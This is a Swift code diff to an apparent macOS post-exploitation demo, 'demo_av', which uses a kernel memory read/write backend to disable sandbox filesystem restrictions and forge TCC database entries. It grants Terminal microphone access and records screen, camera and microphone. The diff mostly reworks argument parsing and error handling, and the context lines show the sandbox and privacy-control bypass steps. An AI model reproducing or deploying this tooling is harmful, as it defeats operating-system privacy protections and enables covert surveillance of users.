@@ -160,10 +160,6 @@ extension CaptureSession {
 // MARK: Output
 extension CaptureSession {
     private func configureOutput() throws {
-        if FileManager.default.fileExists(atPath: outputFile.path) {
-            throw CaptureError.outputFileExist
-        }
-        
         if (!session.canAddOutput(output)) {
             fatalError("cannot add output to session")
         }
@@ -315,21 +311,62 @@ func findTerminalProcess() throws -> uintptr_t {
 }
 
 
+// MARK: - Argument parsing
+
+func print_usage() {
+    print("[I] usage: demo_av [-k kmem_uds] [-v video_mode] [-a audio_mode] [-f] output_file")
+    print("[I] kmem_uds: path to kmem server unix domain socket")
+    print("[I] video_mode: one of [none, camera, screen], default: screen")
+    print("[I] audio_mode: one of [none, mic], default: mic")
+    print("[I] use -f flag to force overwrite if output file already exist")
+    print("[I] example usage: demo_av -v camera -a mic capture.mov")
+}
+
+var kmem_socket: String? = nil
+var video = "screen"
+var audio = "mic"
+var overwrite = false
+
+var ch: Int32 = 0
+while true {
+    ch = getopt(CommandLine.argc, CommandLine.unsafeArgv, "k:v:a:f")
+    guard ch != -1 else {
+        break
+    }
+    
+    switch Character(Unicode.Scalar(UInt8(ch))) {
+    case "k":
+        kmem_socket = String(cString: optarg)
+    case "v":
+        video = String(cString: optarg)
+    case "a":
+        audio = String(cString: optarg)
+    case "f":
+        overwrite = true
+    default:
+        print_usage()
+        exit(1)
+    }
+}
+
+guard CommandLine.argc > optind else {
+    print("[E] output file path required")
+    print_usage()
+    exit(1)
+}
+
+let path = CommandLine.arguments[Int(optind)]
+
+
 // MARK: - Main
 
-if (CommandLine.argc != 5) {
-    print("[E] invalid arguments")
-    print("[I] usage: demo_av <path-to-kmem> <none|camera|screen> <none|mic> <path-to-output-file>")
+guard let video = VideoInputSource(rawValue: video) else {
+    print("[E] invalid video mode \(video). Should be one of camera, screen or none")
     exit(1)
 }
 
-guard let video = VideoInputSource(rawValue: CommandLine.arguments[2]) else {
-    print("[E] invalid video mode \(CommandLine.arguments[2]). Should be one of camera, screen or none")
-    exit(1)
-}
-
-guard let audio = AudioInputSource(rawValue: CommandLine.arguments[3]) else {
-    print("[E] invalid audio mode \(CommandLine.arguments[3]). Should be one of mic or none")
+guard let audio = AudioInputSource(rawValue: audio) else {
+    print("[E] invalid audio mode \(audio). Should be one of mic or none")
     exit(1)
 }
 
@@ -338,12 +375,24 @@ if video == .none && audio == .none {
     exit(1)
 }
 
-let path = CommandLine.arguments[4]
+guard overwrite || !FileManager.default.fileExists(atPath: path) else {
+    print("[E] output file \(path) already exist, use -f flag to force overwrite")
+    exit(1)
+}
+
+if FileManager.default.fileExists(atPath: path) {
+    try? FileManager.default.removeItem(atPath: path)
+}
 
 print("[I] initializing kmem")
 xe_init()
-let kmem_socket = CommandLine.arguments[1]
-var kmem_backend = xe_kmem_remote_client_create(kmem_socket)
+var kmem_backend: xe_kmem_backend_t? = nil
+var error = xe_kmem_remote_client_create(kmem_socket, &kmem_backend)
+guard error == 0 else {
+    print("[E] cannot connect to kmem server, err:", String(cString: strerror(error)))
+    exit(1)
+}
+
 xe_kmem_use_backend(kmem_backend!)
 let mach_execute_header = xe_kmem_remote_client_get_mh_execute_header(kmem_backend)
 xe_slider_kernel_init(mach_execute_header)
@@ -379,7 +428,7 @@ print("[I] disabling sandbox FS restrictions")
 xe_util_sandbox_disable_fs_restrictions(util_sandbox!)
 
 print("[I] authorizing com.apple.Terminal to use kTCCServiceMicrophone")
-var error = xe_util_tcc_authorize(user_tcc_database, "com.apple.Terminal", "kTCCServiceMicrophone")
+error = xe_util_tcc_authorize(user_tcc_database, "com.apple.Terminal", "kTCCServiceMicrophone")
 if error != 0 {
     print("[E] cannot send authorization to TCC.db, err:", error)
     xe_util_sandbox_destroy(&util_sandbox)
